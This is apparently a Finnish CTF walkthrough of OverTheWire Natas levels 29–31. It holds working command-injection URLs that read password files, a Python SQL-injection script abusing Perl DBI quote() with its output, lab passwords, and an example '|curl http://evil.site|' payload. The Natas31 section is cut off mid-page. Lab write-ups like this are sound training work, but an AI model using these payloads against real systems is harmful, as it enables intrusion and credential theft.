<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas29", "pass": "31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">

<style>

#content {
    width: 1000px;
}
pre{
    background-color: #000000; 
    color: #00FF00; 
} 

</style>

<h1>natas29</h1>
<div id="content">
END
#
# morla /10111
# '$_=qw/ljttft3dvu{/,s/./print chr ord($&)-1/eg'
#
# credits for the previous level go to whoever 
# created insomnihack2016/fridginator, where i stole the idea from. 
# that was a fun challenge, Thanks! 
#

print <<END;
H3y K1dZ,<br>
y0 rEm3mB3rz p3Rl rit3?<br>
\\/\\/4Nn4 g0 olD5kewL? R3aD Up!<br><br>

<form action="index.pl" method="GET">
<select name="file" onchange="this.form.submit()">
  <option value="">s3lEcT suMp1n!</option>
  <option value="perl underground">perl underground</option>
  <option value="perl underground 2">perl underground 2</option>
  <option value="perl underground 3">perl underground 3</option>
  <option value="perl underground 4">perl underground 4</option>
  <option value="perl underground 5">perl underground 5</option>
</select>
</form>

END

if(param('file')){
    $f=param('file');
    if($f=~/natas/){
        print "meeeeeep!<br>";
    }
    else{
        open(FD, "$f.txt");
        print "<pre>";
        while (<FD>){
            print CGI::escapeHTML($_);
        }
        print "</pre>";
    }
}

print <<END;
<div id="viewsource">c4n Y0 h4z s4uc3?</div>
</div>
</body>
</html>
END
```

Tässä html koodi pätkässä on tärkeä osa tämä if-else parametri - koska hyökkäyksen harjoituksen kannalta:

```
if(param('file')){
    $f=param('file');
    if($f=~/natas/){
        print "meeeeeep!<br>";
    }
    else{
        open(FD, "$f.txt");
        print "<pre>";
        while (<FD>){
            print CGI::escapeHTML($_);
        }
        print "</pre>";
    }
}
```

Tässä on muutamia vaihtoehtoja kiellettyjen merkkijonojen ohittamiseen. Löytämäni vaihtoehto sai inspiraationsa tästä CTF-kuvauksesta. Se käyttää jokerimerkkejä hakemiston tai tiedostonimen löytämiseen. Toi polku `/natas` voi olla ratkaisu polku.


**Seuraavaksi, kohti ratkaisua:**
Tässä tasossa puhuttu kokoajan Perl underground juttua - niin kyseessä on "natas" ja mitä tapahtuu muutettaan toi sana vähäsen. Suodatettaan ja muutettaan sitä yhdeksi erikoismerkiksi just esim. kysymysmerkki ? 

Tämä on virallinen ratkaisu: `http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/n?tas_webpass/n?tas30%20%00` - koska yritettään hakea se linux hakemisto polkun salasansa `etc/natas_webpass/natas30`. 

**natas30 : WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH**

Yhdessä testissä: `http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/natas_webpass/natas30%00` - koska tämä url parametri tässä on suodatusta estääksen sen siksi saastu vihje "meeeep"


**miksi näin?**
Otin **natas** - sanasta, että merkitsee/korvaa erikoismerkejä tai muulla tahansa mielikuvituksella just jokerimerkkiäyhdistelmällä niin näin saa se tuloksensa. Tässä harjoituksessa pitäis käyttää tätä: `etc/natas_webpass/natas30` - ja tästä muuttaa se perl underground ja käyttäen erikoismerkiä ja siksi vastaus on: `|cat%20/etc/n?tas_webpass/n?tas30%20%00`




## Kali linux testausta 

Pientä tarkistusta varmuuden vuoksi ja harjoittelua, että testataan tätä natas 29 tasoa - ja ettei vain Perl komentojen injektiota.


Nikto testausta, sekä tässä suoritettaan webbi sivustojen skannausta ja syvällistä haavoittuvuutta jos on, sekä komennossa on perässä -id koska syötettään HTTP basic Auth (autentikointi) siksi on tunnus:salasana mukana.

```
┌──(kali㉿kali)-[~]
└─$ nikto -host http://natas29.natas.labs.overthewire.org -id natas29:31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          13.48.176.69
+ Target Hostname:    natas29.natas.labs.overthewire.org
+ Target Port:        80
+ Start Time:         2025-08-14 13:43:16 (GMT3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.58 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ / - Requires Authentication for realm 'Authentication required'
+ Successfully authenticated to realm 'Authentication required' with user-supplied credentials.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
 - STATUS: Completed 4530 requests (~65% complete, 2.8 minutes left): currently in plugin 'Nikto Tests'
- STATUS: Running average: 100 requests: 0.04210 sec, 10 requests: 0.0420 sec.
+ 9031 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2025-08-14 13:52:26 (GMT3) (550 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```


curl komentoja
```
┌──(kali㉿kali)-[~]
└─$ curl http://natas29.natas.labs.overthewire.org/ --user natas29:31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns                                   
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas29", "pass": "31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">

<style>

#content {
    width: 1000px;
}
pre{
    background-color: #000000; 
    color: #00FF00; 
} 

</style>

<h1>natas29</h1>
<div id="content">
H3y K1dZ,<br>
y0 rEm3mB3rz p3Rl rit3?<br>
\/\/4Nn4 g0 olD5kewL? R3aD Up!<br><br>

<form action="index.pl" method="GET">
<select name="file" onchange="this.form.submit()">
  <option value="">s3lEcT suMp1n!</option>
  <option value="perl underground">perl underground</option>
  <option value="perl underground 2">perl underground 2</option>
  <option value="perl underground 3">perl underground 3</option>
  <option value="perl underground 4">perl underground 4</option>
  <option value="perl underground 5">perl underground 5</option>
</select>
</form>

<div id="viewsource">c4n Y0 h4z s4uc3?</div>
</div>
</body>
</html>
```


```
┌──(kali㉿kali)-[~]
└─$ curl "http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/natas_webpass/natas30%00" --user natas29:31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas29", "pass": "31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">

<style>

#content {
    width: 1000px;
}
pre{
    background-color: #000000; 
    color: #00FF00; 
} 

</style>

<h1>natas29</h1>
<div id="content">
H3y K1dZ,<br>
y0 rEm3mB3rz p3Rl rit3?<br>
\/\/4Nn4 g0 olD5kewL? R3aD Up!<br><br>

<form action="index.pl" method="GET">
<select name="file" onchange="this.form.submit()">
  <option value="">s3lEcT suMp1n!</option>
  <option value="perl underground">perl underground</option>
  <option value="perl underground 2">perl underground 2</option>
  <option value="perl underground 3">perl underground 3</option>
  <option value="perl underground 4">perl underground 4</option>
  <option value="perl underground 5">perl underground 5</option>
</select>
</form>

meeeeeep!<br><div id="viewsource">c4n Y0 h4z s4uc3?</div>
</div>
</body>
</html>
```

lisää testausta:

curl "http://natas29.natas.labs.overthewire.org/index.pl?file=%7Ccat%20/etc/n%3Ftas_webpass/n%3Ftas30%00" --user natas29:31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns


%7C = |

%20 = välilyönti

%3F = ?

%00 = null-byte









## lisätietoa ja vihjeitä linkki


https://learnhacking.io/overthewire-natas-level-29-walkthrough/


https://anyafachri.medium.com/command-injection-via-file-inclusion-vulnerability-natas29-overthewire-write-up-16c801259edf


https://ivanitlearning.wordpress.com/2020/02/02/overthewire-natas2729/



---

# natas 30 - START HERE;

natas30 - WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH

Perl injektio


Tässä (view-source.html) välilehdessä vähä kertoo siitä miten se koodi on rakennettu, mutta pieni yllätyksenä se on vähä erilainen näköinen verrattuna aikaisempiin tasoihin. Tämä liittyy Perl koodaukseen, kun lähettää pyynnön POST methodinsa - mitä tämä tarkoittaa sitä käyttäjänimen ja salasanan tarkistusta - eli tarkistaa sen täsmennyksen jos on tietokannassa. Kysely muodostuu $dbh->quote(param()) formaatilla. Jos tulostus täsmentyy näyttää seuraavan tason salasansa, jos ei täsmennys käyttis ja salasana niin normaalisti kertoo on epäonnistunut muodossa eli fail :(


Tässä ongelmana on tässä SQL injektiossa, jos käytettäisiin yleisellä injektio syötteellä `' OR 1=1 --` tai sitä vastaavaa epäilyttäviä termistöjä niin se ei toimi ja on löydetävä toinen virhe. Ainakin itse testattuna username ja salasankenttään syöttämällä toi yleisen injektion termistön niin antaa `fail :(`.

`$dbh`- tarkoittaa **dabase handle** eli tietokantayhteyden käsittelijäobjekti. 
Alussa lukee käytettään `use DBI` - joka on Perl moduuli, josta käytetään tietokantayheyttä (Databse Interface)

Tämä on toisten löytäm tieto koskien "Perl SQL injektiota" , jossa se yhtenä kappale/osa vastauksena. Tämä siis linki/kuva vastaus käsittelee asia melko tarkasti ja lyhyesti sanottuna se on koskien: 
- Tämä Perl-ohjelma on altis SQL-injektiolle, erityisesti kun käytetään MySQL-tietokantaa DBI-ajurin kautta. Haavoittuvuus liittyy tapaan, jolla ohjelma käsittelee HTTP-parametreja ja käyttää `$dbh->quote()`-metodia.
- Perl ohjelman SQL injektio syntyy siitä:
  - `param()` - voi palauttaa taulukon, vaikka odotetaan yksittäistä arvoa
  - `quote` - ei lainaa arvoa, jos sille annetaan `SQL_INTEGER` -tyyppi

linkki: https://security.stackexchange.com/questions/175703/is-this-perl-database-connection-vulnerable-to-sql-injection/175872#175872 (kuva)



quote()-funktion käyttö DBI:ssä (Perl)

Tämä muistiinpano käsittelee `quote()`-funktion käyttöä Perl-ohjelmoinnissa DBI-kirjaston yhteydessä, ja siihen liittyvää mahdollista haavoittuvuutta.

`quote()`-funktio on tarkoitettu suojaamaan SQL-kyselyjä lisäämällä lainausmerkit arvojen ympärille. Tämä auttaa estämään SQL-injektiot, kun käyttäjän syötteitä käytetään kyselyissä.

Jos `quote()`-funktiota kutsutaan **kahdella arvolla** (eli listana), kuten:

```
$dbh->quote($arvo, $tyyppi);quote(param('username')) . " and password =".$dbh->quote(param('password')); 
```

ja toinen arvo on esimerkiksi kokonaisluku (`SQL_INTEGER`), funktio ei lainaa arvoa. Tämä voi johtaa siihen, että käyttäjän syöte päätyy SQL-lauseeseen ilman lainausmerkkejä, mikä mahdollistaa SQL-injektion.



## kali linux - START HERE

Pientä kali linux komentoja tarkistukseen level 30:teen

natas30 - WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH




┌──(kali㉿kali)-[~]
└─$ curl -e http://natas31.natas.labs.overthewire.org/ http://natas30:WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH@natas30.natas.labs.overthewire.org
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas30", "pass": "WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">

<!-- morla/10111 <3  happy birthday OverTheWire! <3  -->

<h1>natas30</h1>
<div id="content">

<form action="index.pl" method="POST">
Username: <input name="username"><br>
Password: <input name="password" type="password"><br>
<input type="submit" value="login" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>


┌──(kali㉿kali)-[~]
└─$ curl -v -e http://natas31.natas.labs.overthewire.org/ http://natas30:WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH@natas30.natas.labs.overthewire.org
* Host natas30.natas.labs.overthewire.org:80 was resolved.
* IPv6: (none)
* IPv4: 56.228.72.241
*   Trying 56.228.72.241:80...
* Connected to natas30.natas.labs.overthewire.org (56.228.72.241) port 80
* Server auth using Basic with user 'natas30'
> GET / HTTP/1.1
> Host: natas30.natas.labs.overthewire.org
> Authorization: Basic bmF0YXMzMDpXUWh4MUJ2Y21QOWlyczJNUDl0Um5Mc05hREk3NllySA==
> User-Agent: curl/8.7.1
> Accept: */*
> Referer: http://natas31.natas.labs.overthewire.org/
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Sat, 23 Aug 2025 14:12:23 GMT
< Server: Apache/2.4.58 (Ubuntu)
< Vary: Accept-Encoding
< Transfer-Encoding: chunked
< Content-Type: text/html; charset=iso-8859-1
< 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas30", "pass": "WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">

<!-- morla/10111 <3  happy birthday OverTheWire! <3  -->

<h1>natas30</h1>
<div id="content">

<form action="index.pl" method="POST">
Username: <input name="username"><br>
Password: <input name="password" type="password"><br>
<input type="submit" value="login" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
* Connection #0 to host natas30.natas.labs.overthewire.org left intact



┌──(kali㉿kali)-[~]
└─$ sqlmap -u "http://natas30.natas.labs.overthewire.org/" --data="natas30=admin&password=WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH" --batch
        ___
       __H__                                                                                                                                      
 ___ ___["]_____ ___ ___  {1.8.5#stable}                                                                                                          
|_ -| . [(]     | .'| . |                                                                                                                         
|___|_  [,]_|_|_|__,|  _|                                                                                                                         
      |_|V...       |_|   https://sqlmap.org                                                                                                      

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:52:59 /2025-08-23/

[17:53:00] [INFO] testing connection to the target URL
[17:53:00] [CRITICAL] not authorized, try to provide right HTTP authentication type and valid credentials (401). If this is intended, try to rerun by providing a valid value for option '--ignore-code'
[17:53:00] [WARNING] HTTP error codes detected during run:
401 (Unauthorized) - 1 times
[17:53:00] [WARNING] your sqlmap version is outdated

[*] ending @ 17:53:00 /2025-08-23/





┌──(kali㉿kali)-[~/Desktop/Python koodit]
└─$ cat pythonkoodi30.py  
import requests
from requests.auth import HTTPBasicAuth

basicAuth=HTTPBasicAuth('natas30', 'WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH')

u="http://natas30.natas.labs.overthewire.org/index.pl"

params={"username": "natas28", "password": ["'lol' or 1", 4]}
response = requests.post(u, data=params, auth=basicAuth, verify=False)

print(response.text)



┌──(kali㉿kali)-[~/Desktop/Python koodit]
└─$ python pythonkoodi30.py      
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas30", "pass": "WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">

<!-- morla/10111 <3  happy birthday OverTheWire! <3  -->

<h1>natas30</h1>
<div id="content">

<form action="index.pl" method="POST">
Username: <input name="username"><br>
Password: <input name="password" type="password"><br>
<input type="submit" value="login" />
</form>
win!<br>here is your result:<br>natas31m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>



Suoritettun tämän koodin jälkeen, niin tässä viittaus liittyen Perl-ohjelmointikieleen (view-source.html), jossa on **DBI (databse interface)** moduuliin ja tätä käytetään tietokantayhteyksien hallintaan. Kyseessä on, että miksi **toinen parametri, arvo 4**, johtaa **unquoted value** tilannetta eli miksi arvo ei ympäröidä lainausmerkkeillä SQL-lauseella.

Testattu tämä (ylempi) python skripti koodi ja onko se vastaus ja miksi näin, kun siinä oli jotakin sql injektiota syötetty ja testattu UI selaimen kautta - se ei toiminut.


Pientä lisätietoa ainakin tästä. DBI:n (Perl Database Interface) kontekstissa SQL_INTEGER on yksi monista SQL-tyyppien tunnisteista, joita käytetään esimerkiksi quote()-funktion tai bind_param()-funktion yhteydessä. Arvo 4 vastaa SQL_INTEGER-tyyppiä.

lisätietoa: https://www.nntp.perl.org/group/perl.dbi.dev/2001/11/msg485.html?ref=learnhacking.io

- Arvo 4 vastaa SQL_INTEGER, mutta ei ole ainut arvo joka aiheuttaa lainaamattoman arvon.
- DBI:n quote()-funktio voi käyttää toista määritelmää, jos sille annetaan lista, jossa toinen arvo on numeerinen tyyppi.
- Tämä voi johtaa SQL-injektioon, jos käyttäjän syötettä ei käsitellä oikein.
- Pythonilla voi simuloida tätä hyökkäystä lähettämällä `data={"param": ["injektio", 4]}`


Tämä osuus (view-source.html), jossa antamalla toisen arvon 4 käytämällä tätä quote() funktio määritelmää: `$dbh->quote($value, $data_type);` , mutta virallinen view-source.html siellä lukee näin: `$dbh->quote(param('password'))`


- `quote($value, $type)` - voi johtaa lainausmerkkien puuttumiseen, jos tyyppi on numeerinen (esim. 4 = SQL_INTEGER)
- Tämä voi mahdollistaa SQL-injektion, jos arvo sisältää haitallista sisältöä
- Ominaisuus on tarkoitettu tilanteisiin, joissa tyyppi pitää antaa ohjelmallisesti, mutta se voi olla turvaton, jos syöte tulee käyttäjältä


## mini yhteenveto

**Selkeällä suomenkielellä koskien natas30 harjoitusta**, vaikka koskien tässä on sitä **SQL injektiota**.

Kyse on siitä, miten ohjelma käsittelee arvoja, jotka menevät SQL-kyselyyn. Ja erityisesti siitä, **millä tavalla arvo "lainataan"** eli ympäröidään lainausmerkeillä.


💥 Mikä ongelma syntyy?
Ohjelmassa on funktio nimeltä `quote()` , joka lisää lainausmerkit automaattisesti. Mutta jos sille annetaan toinen parametri, joka kertoo että arvo on numero (esim. `4 = SQL_INTEGER`), niin se **ei lisää lainausmerkkejä**.

Tämä alempi on se koodi, jonka suoritettaan python kali linux, jonka suoritettiin.

- `$dbh->quote("'lol' OR 1", 4);`
  -  Tässä (`'lol' OR 1`) - on **haitallinen arvo**, joka yrittää ohittaa salasanantarkistuksen.
  - 4 numero kertoo, että arvo on numero
  - ohjelma ei lainaa arvoa -> se menee suoraan SQL-kyselyyn.
  - Tämä palauttaa kaikki käyttäjät, kosksa `OR 1` - osa on aina tosi.


🧠 Miksi näin?
 - Jos arvo tulee **käyttäjältä** (esim. lomakeesta), ja tyyppi annetaan väärin, se voi johtaa **turvattomaan tilanteeseen.**


🛡️ Miten tämä liittyy SQL_INTEGER?

- SQL_INTEGER on tietotyyppi, joka tarkoittaa kokonaislukua SQL:ssä. Kun ohjelma näkee sen, se olettaa että arvo on numero, eikä tarvitse lainausmerkkejä.
- Mutta jos arvo ei oikeasti ole numero, vaan sisältää haitallista tekstiä, niin silloin syntyy ongelma.

- Jos ohjelma (Perl skriptiä) luulee, että arvo on numero (esim. `SQL_INTEGER`), se ei lainaa sitä – ja jos arvo sisältää SQL-injektion, se voi mennä suoraan kyselyyn ja aiheuttaa tietoturva-aukon. Natas30:ssä on just sitä **Perl-skriptiä** koodattu, joka käsittelee lomakkeen kentistä tulevia arvoja — eli esimerkiksi käyttäjän syöttämää käyttäjätunnusta ja salasanaa.

```
┌──(kali㉿kali)-[~/Desktop/Python koodit]
└─$ cat pythonkoodi30.py  
import requests
from requests.auth import HTTPBasicAuth

basicAuth=HTTPBasicAuth('natas30', 'WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH')

u="http://natas30.natas.labs.overthewire.org/index.pl"

params={"username": "natas28", "password": ["'lol' or 1", 4]}
response = requests.post(u, data=params, auth=basicAuth, verify=False)

print(response.text)
```

🔄 Tietovirta: Miten käyttäjän syöte kulkee ohjelman läpi:

- Tässä ketjussa jokainen vaihe voi joko suojata tai altistaa järjestelmän SQL-injektiolle.

`Käyttäjän syöte → Perl-skripti → quote()-funktio → SQL-kysely → Tietokanta`

- quote() + väärä tyyppi = ei lainausmerkkejä = vaara
- SQL_INTEGER (arvo 4) kertoo ohjelmalle: "Tämä on numero" → ei lainata
- Mutta jos arvo ei oikeasti ole numero, vaan sisältää tekstin + injektion, syntyy aukko


---


# NATAS 31 - START HERE;

aikaisemman natas 30 levelin mukaan piti runnata/suorittaa se python koodi (**pythonkoodi30.py**) niin sillä kautta sai sen natas 31 salasanansa.


natas31 ; m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y

view-sourcce koodissa on kirjoitettu koskien tiedoston upottamista ja muita tiedostontyyppiä, niin upotettun jälkeen se tulosta jotakin formaatti taulukkoa ja just esim. tämä csv excel taulukko.


Tässä ensimmäisenä etusivussa koskien on tiedostojen upottamista, että pari-muutama testauksena se toimii vian Excel (.csv) tiedontyyppisenä ja kuvasta toi pientä error:ia.


## pieni teoria

view-source html koodissa on tällinen skripti funktio if-else osuus ja while osuus kunnes täsmentyy niin saadaan se salasana.

Jossakin ohjeesa tai testeissä - esim. muiden sivustojen mukaan testannut .csv eli excel taulukon injektio hyökkäystä.

```
my $cgi = CGI->new;
if ($cgi->upload('file')) {
    my $file = $cgi->param('file');
    print '<table class="sortable table table-hover table-striped">';
    $i=0;
    while (<$file>) {
        my @elements=split /,/, $_;
```


- `param('file')` palauttaa lomakeparametrin sisällön:
  - Jos oikea tiedosto on lähetetty, `$file` on tiedostokahva → toimii oikein `while (<$file>)`.
  - Jos file-parametri on vain teksti, `$file` on pelkkä merkkijono → `while (<$file>)` ei toimi odotetusti.


- param() on kontekstiriippuvainen → voi palauttaa eri tyyppistä dataa.
- Tämä haavoittuvuus tunnetaan esim. nimellä "Perl file upload RCE".



🔒 Perl CGI:n tiedostonkäsittelyn haavoittuvuus – tiivis kuvaus::

- Perlissä `CGI->param('file')` voi palauttaa joko **tiedostokahvan** (kun oikea tiedosto on lähetetty) tai **pelkän merkkijonon** (esimerkiksi manipuloidusta lomakkeesta). Tämä johtuu siitä, että `param()` on **kontekstiriippuvainen** funktio.

- Jos saadun muuttujan sisältö (esim. `$file`) on **merkkijono**, eikä **tiedostokahva**, mutta sitä silti käytetään `while (<$file>)` tai `open($file)` -rakenteessa, koodi **ei toimi odotetusti** ja saattaa käyttäytyä **vaarallisesti**.

- Perlissä `open()`-funktio tulkitsee merkkijonot, jotka alkavat tai loppuvat **putkimerkillä** (`|`), **suoritettaviksi komennoiksi**. Tällöin käyttäjän syöte voi johtaa **komennon suorittamiseen palvelimella** (**RCE = Remote Code Execution**).

- Hyökkääjä voi huijata järjestelmää lähettämällä `file`-parametrin arvoksi merkkijonon kuten `"|id"` tai `"|curl http://evil.site|"`, jolloin CGI-skripti saattaa suorittaa tämän **komentona**.

- Tämän vuoksi on **äärimmäisen tärkeää tarkistaa**, että `$file` on oikeasti **tiedostokahva** eikä pelkkä **merkkijono** ennen kuin sitä käytetään lukemiseen tai `open()`-kutsussa.


**Lyhyesti sanottuna**: tässä tasossa käytetään CGI-pohjaista Perl-skriptiä, joka vastaanottaa HTML-lomakkeella lähetettyjä tiedostoja. Tämä toimii vähän kuin HTML5:n ja PHP:n tiedostojen lähetys, eli lomake lähettää `file`-nimisen kentän palvelimelle. Taustalla käytetty CGI-moduuli käsittelee tämän kentän, mutta siinä on haavoittuvuus: jos käyttäjä huijaa ja lähettää tiedoston nimen sijaan komennon (esim. `|ls`), voi tämä syöte päätyä suoraan Perl-koodiin ja suorittaa komentorivikäskyjä. Kyseessä on siis tiedostonlähetykseen liittyvä injektiohyökkäys (RCE).


**Jos parannuksena**, tiedostojen upottamisessa pitää käyttää tiettyä funktiota, joka poistaa mahdollisia polkuja ja estääkseen käyttäjän manipulointia tiedostojen polkua esim. linux termistönä ja komentona: `.../` eli tiedostojen injektiota. Toisekseen **tiedostopäätteet** joko rajoitettu tai sallittu vain turvallisiin tiedostotyyppiin mm. **.pdf** ja **.csv** , että validointia ja sanitointia joka sallii tiedostonnimensä ja lauseketta esim. `$filename =~ /^[a-zA-Z0-9_-]+\.(csv|txt)$/` - Tällä estetään haitallisten tiedostonimien syöttäminen.

**Muita huomioita**: Jos ohjelma tekee yhteyksiä ulkoisiin palveluihin tai suorittaa komentorivikäskyjä (esim. curl), nämä kutsut tulee tehdä kontrolloidusti. Käyttäjän syötteet tulee rajata valkoisella listalla (whitelist), jolloin vain ennalta hyväksytyt komennot tai URL-osoitteet sallitaan, ja vaaralliset komentorivit estetään.



## kali linux testausta - START HERE;

```
┌──(kali㉿kali)-[~]
└─$ curl -u natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y "http://natas7.natas.labs.overthewire.org" 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.58 (Ubuntu) Server at natas7.natas.labs.overthewire.org Port 80</address>
</body></html>



┌──(kali㉿kali)-[~]
└─$ curl -H "Referer: http://natas31.natas.labs.overthewire.org/" -u "natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y" http://natas31.natas.labs.overthewire.org/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas31", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- morla/10111 -->
<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas31</h1>
<div id="content">

<form action="index.pl" method="post" enctype="multipart/form-data">
    <h2> CSV2HTML</h2>
    <br>
    We all like .csv files.<br>
    But isn't a nicely rendered and sortable table much cooler?<br>
    <br>
    Select file to upload:
    <span class="btn btn-default btn-file">
